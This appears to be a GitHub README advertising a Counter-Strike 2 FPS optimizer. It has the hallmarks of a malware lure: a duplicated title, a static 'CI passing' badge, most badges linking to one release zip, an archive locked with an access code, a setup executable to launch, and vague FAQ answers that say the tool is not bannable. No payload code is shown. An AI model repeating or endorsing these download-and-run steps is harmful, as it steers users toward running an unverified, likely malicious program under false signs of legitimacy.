<div align="center">

# CS2 FPS Optimizer — CS2 FPS Optimizer — Cs2 Fps Optimizer (Hot-Reload Config, Zero Dependencies)

<p><strong>CS2 FPS Optimizer — CS2 FPS Optimizer — Cs2 Fps Optimizer (Hot-Reload Config, Zero Dependencies): CS2 FPS Optimizer — fps and config in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/cs2-perf-suite-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/cs2-perf-suite-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/cs2-perf-suite-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/cs2-perf-suite?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/cs2-perf-suite-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download cs2-perf-suite-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/cs2-perf-suite-v0.1.0-win64.zip"><img src="banner.svg" alt="CS2 FPS Optimizer Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**CS2 FPS Optimizer — CS2 FPS Optimizer — fps and config in one tool** (`cs2-perf-suite`) is a portable Windows 10/11 runtime suite: drop the prebuilt package, point it at `config/settings.json`, and go. No compiler, no external dependencies, live hot-reload included.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`cs2-perf-suite-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/cs2-perf-suite-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`cs2-perf-suite-v0.1.0-win64.zip`](../../releases/download/v0.1.0/cs2-perf-suite-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `Cs2PerfSuite_Setup_x64.exe` (keep `config/settings.json` in the same folder).

### FAQ

<details>
<summary><b>Pro configs?</b></summary>

A library of top-player settings.
</details>
<details>
<summary><b>Smokes?</b></summary>

Stable frametime.
</details>
<details>
<summary><b>Bannable?</b></summary>

No — configs are legal.
</details>

### Documentation & Guides

- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Usage Guide — commands and options](docs/USAGE.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)

### Configuration (`config/settings.json`)

```json
{
  "module": "cs2-perf-suite",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "configs": {
      "enabled": true
    },
    "tuner": {
      "enabled": true
    },
    "monitor": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

## Building from Source

```bash
git clone https://github.com/TestOwner/cs2-perf-suite.git
cd cs2-perf-suite
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: cs2-perf-suite, optimizer, config, pro, boost, gaming-tools, performance, cs2, fps, cli, developer-tools, open-source, windows, automation, productivity, cpp, portable, prebuilt, tools</sub>
